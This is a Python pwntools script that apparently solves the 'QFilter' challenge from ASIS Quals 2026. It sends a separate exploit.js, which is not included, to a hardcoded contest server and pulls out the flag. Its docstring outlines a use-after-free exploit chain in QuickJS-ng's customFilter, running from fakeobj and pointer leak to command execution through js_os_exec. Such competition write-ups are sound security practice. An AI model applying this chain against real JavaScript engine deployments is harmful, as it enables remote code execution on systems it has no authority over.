#!/usr/bin/env python3
"""QFilter (ASIS Quals 2026) — QuickJS-ng 0.16.2 customFilter UAF.

Array.prototype.customFilter extra-JS_FreeValue's fast-array slots when the
first element is not an object. Reclaim a JSObject as ArrayBuffer data for
fakeobj, leak JSTypedArray* via a confused 31-char string, arb-read to PIE,
scan for js_print, fake a C function to js_os_exec(["/readflag"]).
"""
from __future__ import annotations

import pathlib
import sys

from pwn import context, remote, log

HOST = "65.109.208.46"
PORT = 1337
HERE = pathlib.Path(__file__).resolve().parent
JS = (HERE / "exploit.js").read_text()


def main() -> None:
    context.log_level = "info"
    r = remote(HOST, PORT)
    banner = r.recvuntil(b":", timeout=5)
    log.info("banner %r", banner[:80])
    if b"every 5 seconds" in banner:
        log.failure("rate limited")
        r.close()
        sys.exit(1)
    r.send(JS.encode() + b"\n-- EOF --\n")
    data = r.recvall(timeout=8)
    sys.stdout.buffer.write(data)
    r.close()
    if b"ASIS{" in data:
        flag = data[data.find(b"ASIS{") : data.find(b"}", data.find(b"ASIS{")) + 1]
        (HERE / "FLAG").write_bytes(flag + b"\n")
        log.success("%s", flag.decode())


if __name__ == "__main__":
    main()
